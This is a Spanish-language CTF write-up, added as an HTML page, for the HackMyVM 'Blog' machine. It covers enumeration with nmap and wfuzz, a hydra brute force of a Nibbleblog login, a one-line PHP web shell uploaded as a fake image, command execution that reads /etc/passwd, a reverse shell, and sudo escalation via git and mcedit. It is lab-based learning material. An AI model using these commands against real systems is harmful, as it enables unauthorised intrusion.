@@ -1,0 +1,543 @@
+<!DOCTYPE HTML>
+<html lang="es">
+
+<!-- Web Site diseñada y programada por Alexandre Varela - ShellDredd -->
+
+<!--      .-----.
+   .' -   - '.
+  /  .-. .-.  \
+  |  | | | |  |     ShellDredd Society
+   \ \o/ \o/ /       -The cyber side-
+  _/    ^    \_
+ | \  '---'  / |
+ / /`--. .--`\ \
+/ /'---` `---'\ \
+'.__.       .__.'
+    `|     |`
+     |     \
+     \      '--.
+      '.        `\
+        `'---.   |
+           ,__) /
+            `..' -->
+	
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <meta http-equiv="cache-control" content="no-cache"/>
+    <link rel="profile" href="https://gmpg.org/xfn/11" />
+    <meta name="robots" content="index,follow" />
+    <meta name="description" contant="Writeups walkthrough de la máquina BLOG creada por d4t4s3c y disponible en la plataforma HackMyVM." />
+    <meta name="keywords" content="hackmyvm, shelldredd, blog vm writeup, d4t4s3c"/>
+    <!-- Twitter Card data -->
+    <meta name="twitter:card" value="summary">
+    <!-- Open Graph data -->
+    <meta property="og:title" content="WriteUp Máquina BLOG de HackMyVM" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://shelldredd.github.io/inicio/blog-writeup-hackmyvm.html" />
+    <meta property="og:image" content="https://hackmyvm.eu/machines/vmcard.php?vm=Blog" />
+    <meta property="og:description" content="Writeups walkthrough de la máquina BLOG creada por d4t4s3c y disponible en la plataforma HackMyVM." />
+	
+    <meta rel="canonical" href="https://shelldredd.github.io/ShellDredd/" />
+    <meta name="author" content="Alexandre Varela ShellDredd" />
+    <meta name="copyright" content="Alexandre Varela ShellDredd" />
+
+    
+    <link  rel="icon"   href="images/flaticon1.jpeg" type="image/jpeg" sizes="16x16" />
+    <link href="../css/home.css" rel="stylesheet">
+
+    <title>ShelDredd Society</title>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KJJZDEW4W0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-KJJZDEW4W0');
+</script>
+
+</head>
+
+
+<body>
+
+    <div id="contenedor_carga_home">
+        <div id="carga"></div>
+    </div>
+    <script>
+        window.onload = function(){
+            var contenedor = document.getElementById('contenedor_carga_home');
+            contenedor.style.visibility = 'hidden';
+            contenedor.style.opacity = '0';
+        }
+    </script>
+
+
+    <main class="main">
+
+            <div class="portada-hmv"></div>
+          </div>
+
+
+        <div class="bloque-texto">
+        
+          <h2 class="h2-articulos">WriteUp Máquina Blog</h2><br>
+            <input type="checkbox" id="img-articulos-click"/>
+            <label class="img-articulos" for="img-articulos-click"><img class="img-articulos" src="../blogvm/blog-d4t4s3c.png"/></label>
+            <br><br>
+
+            <div class="plan plan2">
+                <ul class="ul-art-horizontal">
+                  <li>✪Plataforma: HackMyVM</li>
+                  <li>✪Dificultad: Fácil</li>
+                  <li>✪Creador: d4t4s3c</li>
+                  <li>✪Twitter: @d4t4s3c</li>
+                  <li>✪GitHub: github.com/d4t4s3c</li>
+                </ul>
+              </div>
+
+              <h2 class="h2-articulos">Gestionar el entorno y las máquinas.</h2><br>
+            <p class="texto-parrafo">Una vez virtualizada la máquina víctima "Blog" y el sistema atacante preferido con el software de virtualización VirtualBox, 
+                iniciamos la comprobación del entorno con un escaneo de dispositivos conectados en red local y acotando por las siglas "PCS" dado que es
+                la denominación de dispositivos en red que utiliza VirtualBox.<br><br>
+                <ul class="texto-articulos">
+                    <li>arp-scan -l | grep "PCS" | awk {'print $1'}</li>
+                  </ul><br>
+                
+                Si deseamos guardar esta información en un archivo de texto, podemos utilizar una redirección del STDOUT de la orden del sistema hacia un archivo de texto, 
+                usando la sintaxis y caracter ">" el cual, crea o sobreescribre el contenido de un archivo de texto. Si utilizamos dos ">>" en vez de sobreescribir sobre 
+                el contenido del archivo, lo que sucederá es que escribirá la información en la última línea disponible añadiendo un salto de línea a la anterior.<br><br>
+                <ul class="texto-articulos">
+                    <li>arp-scan -l | grep "PCS" | awk {'print $1'} > datos</li>
+                  </ul><br>
+
+                  <input type="checkbox" id="img-articulos-click2"/>
+                  <label class="img-articulos" for="img-articulos-click2"><img class="img-articulos" src="../blogvm/blog-arp-scan.png"/></label>
+                  <br>
+                  <input type="checkbox" id="img-articulos-click3"/>
+                  <label class="img-articulos" for="img-articulos-click3"><img class="img-articulos" src="../blogvm/blog-arp-scan2.png"/></label>
+                  <br><br>
+            
+                  <p class="texto-parrafo">Ahora disponemos de IP correspondiente a la máquina víctima, preparamos una variable en sistema que guarde la misma, de forma que no necesitaremos
+                    posteriormente copiar y pegar.<br><br>
+                    <ul class="texto-articulos">
+                        <li>ip=192.168.1.53</li>
+                      </ul><br>
+    
+   <h2 class="h2-articulos">Enumeración de servicios y puertos.</h2><br>
+              <p class="texto-parrafo">Para comprobar si realmente existe una salida hacia la red por parte de la máquina víctima (trazabilidad ICMP), ejecutamos un ping que además nos ofrecerá alguna información 
+                extra, como el TTL (denominación correspondiente al sistema operativo).<br><br>
+                <ul class="texto-articulos">
+                    <li>ping -c 1 $ip</li>
+                  </ul><br>
+                  <input type="checkbox" id="img-articulos-click4"/>
+                  <label class="img-articulos" for="img-articulos-click4"><img class="img-articulos" src="../blogvm/blog-ping.png"/></label>
+                  <br><br>
+                  Obtenemos un TTL de 64 por lo que estamos ante un sistema Gnu/Linux, con esta información podemos continuar con un escaneo de servicios y puertos hacia la IP 
+                  de la máquina víctima. Personalmente me gusta utilizar una metodología de escaneo doble, primero un sondeo rápido de puertos abiertos para luego realizar un 
+                  análisis más amplio a los puertos abiertos descubiertos con la parametrización del primer nmap que ejecuto, esto es práctico ya que ahorramos tiempo de escaneo 
+                  con la herramienta nmap, debido a que el segundo nmap es más agresivo y con parametrización que extrae más información que el anterior y si lo lanzamos hacia 
+                  todos los puertos, deriba más tiempo.<br>
+                  Para tener la información bien documentada en nuestro directorio predefinido de la máquina, guardaremos el STDOUT del segundo nmap en un archivo de texto, para 
+                  ello utilizaremos el parámetro "-oN" que guarda la salida en formato nmap hacia un archivo de texto.<br><br>
+                  <ul class="texto-articulos">
+                    <li>nmap -sS -n -Pn -p- --min-rate=6500 $ip --open</li><br>
+                    <li>nmap -sCV -p22,80 $ip -oN nmap-scan</li>
+                  </ul><br>
+
+              <input type="checkbox" id="img-articulos-click5"/>
+              <label class="img-articulos" for="img-articulos-click5"><img class="img-articulos" src="../blogvm/blog-nmap1.png"/></label>
+              <div>
+              <input type="checkbox" id="img-articulos-click6"/>
+              <label class="img-articulos" for="img-articulos-click6"><img class="img-articulos" src="../blogvm/blog-nmap2.png"/></label><br>
+              </div>
+              <br>
+
+              <h2 class="h2-articulos">Enumeración servicio Web.</h2><br>
+
+              <p class="texto-parrafo">
+                Dos servicios corriendo en puertos, aplicación de red SSH por el 22 y servicio web por el 80 sostententado por apache, además obtenemos que el sistema es 
+                un debian. Un curl como método rápido de visualización del contenido web dependiente de la IP.<br><br>
+                <ul class="texto-articulos">
+                    <li>curl -s $ip</li>
+                  </ul><br>
+
+                Nos indica que existe un "pre" indicando un ping y un dominio "blog.hmv", se podría deducir que necesitamos añadir este a nuestro /etc/host pero en este caso 
+                no es necesario así que continuamos con un fuzzing de estexiones y directorios web dependientes de IP, en este caso usamos la herramienta Wfuzz.</p><br>
+                <ul class="texto-articulos">
+                <li>wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $ip/FUZZ</li>
+                </ul><br>
+
+                Observamos que existe un directorio o extensión llamado "my_weblog" con una respuesta de 301.<br>
+                
+                <input type="checkbox" id="img-articulos-click6"/>
+                <label class="img-articulos" for="img-articulos-click6"><img class="img-articulos" src="../blogvm/blog-fuzzing1.png"/></label><br><br>
+                
+                Después de investigar en el código y en los enlaces, descubrimos un "meta name="generator" content="Nibleblog"" que hace referencia a un gestor de contenidos 
+                web conocido, Nibleblog. Esta es ya una pista llamativa pero aún así continuamos enumerando con el fuzzing pero esta vez desde /my_weblog pero 
+                tampoco devuelve dirctorios, por lo que añadimos extensiones, las que necesitamos son txt y php, las asignamos como parametrización al wfuzz. Efectivamente 
+                esta enumeración nos revela 5 extensión, dos archivos txt y 3 php,  COPYRIGHT.txt alberga información del CMS Nibleblog y su fecha de copyright (2009 - 2013), 
+                deducimos trás una búsqueda en google que tenemos dos versiones en este periodo de tiempo. Tenemos un posible vector de ataque.<br><br>
+                <ul class="texto-articulos">
+                  <li>wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php-txt 'http://192.168.1.53/my_weblog/FUZZ.FUZ2Z'</li>
+                  </ul><br>
+
+                  <input type="checkbox" id="img-articulos-click7"/>
+                  <label class="img-articulos" for="img-articulos-click7"><img class="img-articulos" src="../blogvm/blog-codigo1.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click8"/>
+                  <label class="img-articulos" for="img-articulos-click8"><img class="img-articulos" src="../blogvm/blog-fuzzing2-extensiones.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click9"/>
+                  <label class="img-articulos" for="img-articulos-click9"><img class="img-articulos" src="../blogvm/blog-copyright1.png"/></label><br><br>
+
+                  <h2 class="h2-articulos">Explotación CMS Nibleblog.</h2><br>
+                  Buscamos exploits para el CMS y su versión, existe uno que utiliza la subida de un archivo para gestionar una reverse shell con PHP pero se requiere 
+                  autentificación por lo que no nos sirve. El siguiente paso es realizar fuerza bruta al login con la esperanza de obtener credenciales, 
+                  para este proceso utilizamos hydra pero nos falta un detalle importante, conocer el formato de las peticiones que hace el login desde el panel admin.php.
+                  Descubrimos un post con la sintáxis de error, de la cual hacemos acópio para nuestra fuerza bruta (se observa desde inspector de código, en la pestaña de
+                  Network, hacemos un login aleatorio, click en el "document" de la petición y seleccionamos la pestaña "request").<br>
+                  <input type="checkbox" id="img-articulos-click10"/>
+                  <label class="img-articulos" for="img-articulos-click10"><img class="img-articulos" src="../blogvm/blog-peticion-admin.png"/></label><br><br>
+                  Fuerza bruta con hydra:<br>
+                  <ul class="texto-articulos">
+                    <li>hydra -t 50 -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form '/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect'</li>
+                    </ul><br>
+                    <input type="checkbox" id="img-articulos-click11"/>
+                    <label class="img-articulos" for="img-articulos-click11"><img class="img-articulos" src="../blogvm/blog-hydra.png"/></label><br><br>
+
+                    Hemos tenido suerte con las credenciales, accedemos como administrador al panel de gestión del CMS Nibbleblog y observando los exploits comentados 
+                    anteriormente, el vector de ataque para acceder al sistema se basa en la subida de una "imagen" a través del apartado de plugins, pero nosotr@s usaremos un 
+                    archivo con extensión "php" que contendrá una sintáxis del lenguaje que nos permite provocar un RCE (ejecución de comandos remotamente) y de la cuál haremos 
+                    uso para extraer info delicada del sistema y además, gestionar una reverse shell que nos dará acceso al sistema como usuario www-data.
+                    (Este fallo es común en algunos CMS, la funcionalidad de subida de imagenes NO restringe formatos de archivo diferentes a los correspondientes para imágenes).<br>
+                    <input type="checkbox" id="img-articulos-click12"/>
+                    <label class="img-articulos" for="img-articulos-click12"><img class="img-articulos" src="../blogvm/blog-panel1.png"/></label><br>
+                    <input type="checkbox" id="img-articulos-click13"/>
+                    <label class="img-articulos" for="img-articulos-click13"><img class="img-articulos" src="../blogvm/blog-panel2.png"/></label><br>
+                    <input type="checkbox" id="img-articulos-click14"/>
+                    <label class="img-articulos" for="img-articulos-click14"><img class="img-articulos" src="../blogvm/blog-panel-imagen1.png"/></label><br><br>
+                Generamos un archivo con extensión php que contenga la siguiente sintáxis:<br><br>
+                <ul class="texto-articulos">
+                  <li>?php system($_GET['cmd']); ?></li>
+                  </ul><br>
+                  Subimos el archivo en el CMS.<br>
+                  <input type="checkbox" id="img-articulos-click15"/>
+                  <label class="img-articulos" for="img-articulos-click15"><img class="img-articulos" src="../blogvm/blog-php1.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click16"/>
+                  <label class="img-articulos" for="img-articulos-click16"><img class="img-articulos" src="../blogvm/blog-panel-subida1.png"/></label><br><br>
+
+                  Ahora la pregunta clave, ¿donde diablos está alojada mi "imagen falsa"?. Bueno tendremos que investigar en google para descubrir la ruta de visionado de imagenes 
+                  correspondiente al CMS Nibbleblog, utilizando el siguiente dork: "content image nibbleblog", google es tan amable de ofrecernos la solución en el primer enlace.<br>
+                  Nos revela que el directorio para visualizar las imágenes subidas es el siguiente:<br><br>
+                  <ul class="texto-articulos">
+                    <li>/my_weblog/content/private/plugins/my_image/</li>
+                    </ul><br>
+                  Añadimos nuestra imagen maliciosa con extensión php "/my_image/image.php" y comprobamos que da acceso y código de respuesta 200. El siguiente paso es añadir 
+                  la sintáxis de ejecución de órdenes de sistema correspondiente al RCE en php.<br><br>
+                  <ul class="texto-articulos">
+                    <li>/my_weblog/content/private/plugins/my_image/image.php?cmd=id;hostname;cat /etc/passwd</li>
+                    </ul><br>
+                  Podemos enumerar cierta información desde aquí, como los usuarios del /etc/passwd.<br>
+                  <input type="checkbox" id="img-articulos-click17"/>
+                  <label class="img-articulos" for="img-articulos-click17"><img class="img-articulos" src="../blogvm/blog-rce1.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click18"/>
+                  <label class="img-articulos" for="img-articulos-click18"><img class="img-articulos" src="../blogvm/blog-rce2.png"/></label><br><br>
+
+                  Llegados a este punto, necesitamos una reverse shell para ejecutar desde el RCE obtenido, para ello utilizaremos la herramienta "Shelly" del usuario d4t4s3c y 
+                  que podemos descargar desde su espacio en github. Una vez instalada en nuestro sistema, le otorgamos permisos de ejecución con "chmod +x" y seguimos los pasos 
+                  para generar una reverseshell con netcat. Este paso se puede hacer manual, cuando repites este paso varias veces, recuerdas perfectamente los comandos pero a veces 
+                  fallan y necesitas recurrir a sintáxis de otros lenguajes y aquí, es donde este tipo de herramientas te facilitan el trabajo.<br>
+                  <p>Enlace a la herramienta <a class="enlace" href="https://github.com/d4t4s3c/Shelly" target="blank">Shelly</a></p><br>
+                  <input type="checkbox" id="img-articulos-click19"/>
+                  <label class="img-articulos" for="img-articulos-click19"><img class="img-articulos" src="../blogvm/blog-reverse-data1.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click20"/>
+                  <label class="img-articulos" for="img-articulos-click20"><img class="img-articulos" src="../blogvm/blog-reverse-data2.png"/></label><br><br>
+                  Desde nuestra máquina atacante entablamos una escucha con netcat para poder recibir la shell inversa que generamos en la web. Es importante asegurarse si el 
+                  puerto que estamos usando no está ocupado por un servicio, ya que esto provocaría que la escucha no surja ningun efecto a pesar de que todo esté bien gestionado.
+                  Primero ejecutamos la escucha y después iniciamos la petición desde el RCE en la web.<br>
+                  <input type="checkbox" id="img-articulos-click21"/>
+                  <label class="img-articulos" for="img-articulos-click21"><img class="img-articulos" src="../blogvm/blog-reverse-data1.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click22"/>
+                  <label class="img-articulos" for="img-articulos-click22"><img class="img-articulos" src="../blogvm/blog-reverse-data2.png"/></label><br><br>
+                  Desde nuestra máquina atacante entablamos una escucha con netcat para poder recibir la shell inversa que generamos en la web. Es importante asegurarse si el 
+                  puerto que estamos usando no está ocupado por un servicio, ya que esto provocaría que la escucha no surja ningun efecto a pesar de que todo esté bien gestionado.
+                  Primero ejecutamos la escucha y después iniciamos la petición desde el RCE en la web.<br>
+                  <input type="checkbox" id="img-articulos-click23"/>
+                  <label class="img-articulos" for="img-articulos-click23"><img class="img-articulos" src="../blogvm/blog-enviar-shell.png"/></label><br>
+                  <input type="checkbox" id="img-articulos-click24"/>
+                  <label class="img-articulos" for="img-articulos-click24"><img class="img-articulos" src="../blogvm/blog-netcat1.png"/></label><br><br>
+
+                  <h2 class="h2-articulos">Enumeración y explotación de sistema.</h2><br>
+                  Ya tenemos acceso al sistema como usuario www-data y comenzamos con las metodologías de enumeración en sistema pero antes hacemos un tratamiento de TTY 
+                  para tener comodidad y funcionalidades en la shell. Este es un ejemplo de tratamiento de tty con bash:<br>
+                  # En el sistema víctima:<br><br>
+                  <ul class="texto-articulos">
+                    <li>script /dev/null -c bash</li>
+                    <li>[ctrl+z]</li>
+                    </ul><br>
+                  # Nos envía a la shell de nuestro equipo atacante y ejecutamos:<br><br>
+                  <ul class="texto-articulos">
+                    <li>stty raw -echo;fg</li>
+                    <li>[ENTER]</li>
+                    <li>reset</li>
+                    <li>xterm</li>
+                    </ul><br>
+                  # Regresamos a la shell de la máquina víctima:<br><br>
+                  <ul class="texto-articulos">
+                    <li>export TERM=xterm</li>
+                    <li>export SHELL=bash</li>
+                    <li>reset</li>
+                    <li>xterm</li>
+                    </ul><br>
+                  # Ahora nos falta acomodar las clumnas y filas de la shell, nos dirigimos a la terminal de sistema atacante para ver que medidas tenemos y escribimos para ello:<br><br>
+                  <ul class="texto-articulos">
+                    <li>stty -a</li>
+                    </ul><br>
+                  # Nos quedamos con las medidas y volvemos a la shell de la máquina víctima para añadir estas filas y columnas:<br><br>
+                  <ul class="texto-articulos">
+                    <li>stty rows 42 columns 187</li>
+                    </ul><br>
+
+                    Existen varios métodos para enumerar, uno de ellos es el comando "sudo -l" que nos devuelve información de los permisos que tenemos con sudo 
+                    para ejecutar binarios o comandos sin contraseña bajo el manto de otro usuario del sistema. Efectivamente, en este caso es así, 
+                    podemos ejecutar /usr/bin/git como usuario "admin" sin passwd.<br><br>
+                    <input type="checkbox" id="img-articulos-click25"/>
+                    <label class="img-articulos" for="img-articulos-click25"><img class="img-articulos" src="../blogvm/blog-git1.png"/></label><br>
+                    <input type="checkbox" id="img-articulos-click26"/>
+                    <label class="img-articulos" for="img-articulos-click26"><img class="img-articulos" src="../blogvm/blog-git2.png"/></label><br>
+                    <input type="checkbox" id="img-articulos-click27"/>
+                    <label class="img-articulos" for="img-articulos-click27"><img class="img-articulos" src="../blogvm/blog-admin1.png"/></label><br><br>
+
+                    Después conseguir pivotar hacia el usuario admin, volvemos con las metodologías de enumeración en sistema y al igual que con el usuario data, con "sudo -l" 
+                    observamos que tenemos permisos de ejecución de binario como root sin passwd para /usr/bin/mcedit .
+                    Buscando información acerca de "mcedit" encontramos una forma de conseguir una shell dentro del interfaz del propio programa.<br>
+                    Estos son los pasos:<br><br>
+                    <ul class="texto-articulos">
+                      <li>sudo -u root /usr/bin/mcedit</li>
+                      <li>F9</li>
+                      <li>Desde el botón de FILE, seleccionamos User Menu.</li>
+                      <li>Dentro del menu de usuario, seleccionamos la opción de "invoke shell".</li>
+                      </ul><br>
+                      <input type="checkbox" id="img-articulos-click28"/>
+                      <label class="img-articulos" for="img-articulos-click28"><img class="img-articulos" src="../blogvm/blog-mcedit1.png"/></label><br>
+                      <input type="checkbox" id="img-articulos-click29"/>
+                      <label class="img-articulos" for="img-articulos-click29"><img class="img-articulos" src="../blogvm/blog-mcedit2.png"/></label><br>
+                      <input type="checkbox" id="img-articulos-click30"/>
+                      <label class="img-articulos" for="img-articulos-click30"><img class="img-articulos" src="../blogvm/blog-mcedit3.png"/></label><br>
+                      <input type="checkbox" id="img-articulos-click31"/>
+                      <label class="img-articulos" for="img-articulos-click31"><img class="img-articulos" src="../blogvm/blog-root.png"/></label><br><br>
+                      !Ya somos usuario administrador en el sistema!<br>
+                      <input type="checkbox" id="img-articulos-click32"/>
+                      <label class="img-articulos" for="img-articulos-click32"><img class="img-articulos" src="../blogvm/perfect.gif"/></label><br><br>
+                      <br>
+                      Antes de finalizar este writeup, me gustaría dar las gracias a HackMyVm por la gran comunidad y contenido de aprendizaje de alto nivel que ofrece de 
+                      forma gratuita. También quiero agradecer al usuario d4t4s3c su labor y contribuciones, es un placer estudiar y aprender rodeado de usuari@s de este nivel.<br>
+                      
+
+
+                    
+
+
+
+
+
+
+
+
+
+
+
+              <br>
+              <h2 class="h2-articulos">Nos vemos en el próximo artículo.</h2><br>
+        </div>
+          
+
+          <!-- Flex Container! -->
+ <div class="pricing-grid">
+  <div class="plan plan1">
+
+    <img class="icon-ctf" src="../images/cont1.gif">
+    <h2 class="prueba-titulo">Máquinas CTF & Retos</h2>
+    <ul class="features">
+      <li></li>
+      <li class="prueba-titulo">Máquinas Vulnerables CTF y retos web exclusivos creados con cariño.
+        Ambientaciones personalizadas para que aprender sea también divertido y cultural.</li>
+      <li>Descubre el mundo la seguridad informática en entornos controlados.</li>
+    </ul>
+    <a href="../inicio/maquinas-ctf.html" class="cta">Ir a la sección<img class="img-gameboy" src="../images/gameboy.gif"></a>
+  </div>
+
+  <div class="plan plan2">
+    
+    <img class="icon-2" src="../images/art-tecnicos-logo.gif">
+    <h2>Artículos Técnicos</h2>
+    <ul class="features">
+      <li></li>
+      <li>Blog sobre tecnología e informática.</li>
+      <li>Explicaciones técnicas de diferentes aspectos.</li>
+      <li>Contenido con documentación.</li>
+    </ul>
+    <a href="../inicio/articulos-tecnologia.html" class="cta">Leer más... <img class="img-boton" src="../images/boton-biblio.gif"></a>
+  </div>
+
+  <div class="plan plan2">
+    
+    <img class="icon-vhs" src="../images/offtopic.gif">
+    <h2>Artículos Offtopic</h2>
+    <ul class="features">
+      <li></li>
+      <li>Sección dedicada a contenido Offtopic.</li>
+      <li>Damos una opinión personal sobre diversas temáticas tecnológicas desde un punto de vista informal.</li>
+    </ul>
+    <br><br><br>
+    <a href="../inicio/proximamente.html" class="cta">Próximamente<img class="img-play1" src="../images/art-raton-botones.png"></a>
+  </div>
+</div>
+</div>
+
+
+
+
+<!-- Nº 2 Flex Container! -->
+<div class="pricing-grid">
+<div class="plan plan1">
+  <img class="icon-hmv" src="../images/art-seguridad-logo.gif">
+  <h2>Seguridad Informática</h2>
+  <ul class="features">
+    <li></li>
+    <li>Writeups, guías y explicaciones.</li>
+    <li>Máquinas recomendadas por nivel.</li>
+    <li>Resolución de laboratorios.</li>
+  </ul>
+  <a href="../inicio/proximamente.html" class="cta">¡Entrar!<img class="img-raton" src="../images/art-raton-botones.png"></a>
+</div>
+
+<div class="plan plan2">
+  <img class="icon-noticias" src="../images/noticia.png">
+  <h2>Noticias Tecnológicas</h2>
+  <ul class="features">
+    <li></li>
+    <li>Contenido en formato texto, vídeo y podcast.</li>
+    <li>Los noticias en directo se emiten los viernes a las 22:30 hora española.</li>
+  </ul>
+  <a href="../inicio/proximamente.html" class="cta">Próximamente<img class="img-raton" src="../images/art-raton-botones.png"></a>
+</div>
+
+<div class="plan plan2">
+  <img class="icon-freedom" src="../images/freedom1.gif">
+  <h2>FOSS LOVERS</h2>
+  <ul class="features">
+    <li></li>
+    <li>Contenido sobre software libre y código abierto.</li>
+    <li>Proxima apertura del grupo de usuarios.</li>
+  </ul>
+  <br>
+  <a href="../inicio/proximamente.html" class="cta">Próximamente<img class="img-raton" src="../images/art-raton-botones.png"></a>
+</div>
+</div>
+
+
+
+        <nav class="dropdownmenu">
+  
+          <ul>
+            <img class="logo1" src="../images/shelldredd-logo.png">
+          <li><a class="titulo-menu">| Menu General</a>
+            <ul id="submenu">
+	      <li><a href="../inicio/home.html">Inicio</a></li>
+              <li><a href="../inicio/articulos-tecnologia.html">Artículos técnicos</a></li>
+              <li><a href="../inicio/hackmyvm.html">HackMyVm</a></li>
+              <li><a href="../inicio/proximamente.html" title="Próximamente">Seguridad informática</a></li>
+              <li><a href="../inicio/proximamente.html" title="Próximamente">Writesup Máquinas</a></li>
+              <li><a href="../inicio/proximamente.html" title="Próximamente">Offtopic</a></li>
+              <li><a href="../inicio/proximamente.html" title="Próxmimamente">Noticias</a></li>
+              <li><a href="../inicio/proximamente.html" title="Próximamente">FOSS Lovers</a></li>
+              
+            </ul>
+          </li>
+          <li><a>| Máquinas CTF Exclusivas</a>
+            <ul id="submenu">
+              <li><a href="../inicio/maquinas-ctf.html">Máquina Video CLub</a></li>
+              <li><a href="../inicio/maquinas-ctf.html">Máquina Celebrity Soup</a></li>
+            </ul>
+          </li>
+        
+          <li><a>| Retos Web</a>
+            <ul id="submenu">
+              <li><a href="https://shelldredd.github.io/23/" target="blamk">Joker Brain Game</a></li>
+            </ul>
+          </li>
+        
+          <li><a>| Eventos & Colaboraciones</a>
+            <ul id="submenu">
+              <li><a href="">Ver Calendario</a></li>
+              <li><a href="https://hackctf.org/ctf/" target="blank">HackCTF</a></li>
+              <li><a href="http://www.gulag.org.mx/congreso-2021.html" target="blank">Conferencia Gulag Software Libre</a></li>
+            </ul>
+          </li>
+        
+          <li><a href="https://shelldredd.github.io/contacto.html">| Contacto</a></li>
+          </ul>
+          </ul>
+          </nav>
+</main>
+
+<!-- Flex Container! -->
+<div class="pricing-grid">
+
+  <div class="plan plan2">
+    
+    <img class="icon-footer1" src="../images/twitch.png">
+    <h2>Directos Twitch</h2>
+    <ul class="features">
+      <li></li>
+      <li>Viernes 22:00 h</li>
+      <li>Sábado  23:30 h</li>
+    </ul>
+    <br><br><br>
+    <a href="#" class="cta">Ir a Twitch<img class="img-raton" src="../images/art-raton-botones.png"></a>
+  </div>
+
+  <div class="plan plan2">
+    
+    <img class="icon-footer1" src="../images/logo-youtube.png">
+    <h2>Youtube</h2>
+    <ul class="features">
+      <li></li>
+      <li>ShellDredd Informática.</li>
+      <li>Todas las secciones de la web y mucho más. Documentales, entrevistas, charlas, etc.</li>
+      <li></li>
+    </ul>
+    <a href="#" class="cta">Ir a Youtube<img class="img-raton" src="../images/art-raton-botones.png"></a>
+  </div>
+
+  <div class="plan plan2">
+
+    <img class="icon-footer1-discord" src="../images/discord-black.png">
+    <h2 class="prueba-titulo">Comunidad Discord</h2>
+    <ul class="features">
+      <li></li>
+      <li class="prueba-titulo">Un servidor lleno de recursos y categorías donde aprender y compartir.</li>
+      <li>Únete a la Sociedad ShellDredd.</li>
+    </ul>
+    <a href="#" class="cta">Únete a la comunidad<img class="img-raton" src="../images/art-raton-botones.png"></a>
+  </div>
+
+</div>
+
+<!-- Flex Container! Footer -->
+<header class="header">
+  <div class="container-logo-nav">
+      <a href="index.html" class="logo">ShellDredd Informática</a>
+      <nav class="navi">
+          <ul class="show">
+              <li><a style="font-weight: bold;" href="https://twitter.com/ShellDredd" target="blank" title="Twitter" target="blank"><img class="icon-twitch" src="../images/twitter.png" width="25px"></a></li>
+              <li><a style="font-weight: bold;" href="https://www.linkedin.com/in/alexandre-varela-sysadmin/" target="blank" title="Linkedin"><img class="icon-github" src="../images/linkedin.png"></a></li>
+          </ul>
+      </nav>
+  </div>
+    <h3 class="texto-footer">© 2022 Todos los derechos reservados Alexandre Varela || Web diseñada y programada desde 0 con las tecnologías HTML5, CSS3 y JavaScript.</h3>
+</header><br><br><br>
+
+</body>
